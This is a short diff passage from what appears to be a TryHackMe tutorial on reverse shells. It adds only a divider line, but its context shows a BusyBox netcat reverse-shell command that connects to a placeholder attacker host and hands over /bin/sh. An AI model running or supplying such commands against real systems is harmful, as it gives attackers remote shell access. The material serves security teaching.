@@ -273,3 +273,5 @@ This reverse shell uses AWK’s built-in TCP capabilities to connect to `ATTA
 target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
 ```
 This BusyBox reverse shell uses Netcat (`nc`) to connect to the attacker at `ATTACKER_IP:443`. Once connected, it executes `/bin/sh`, exposing the command line to the attacker.
+
+---
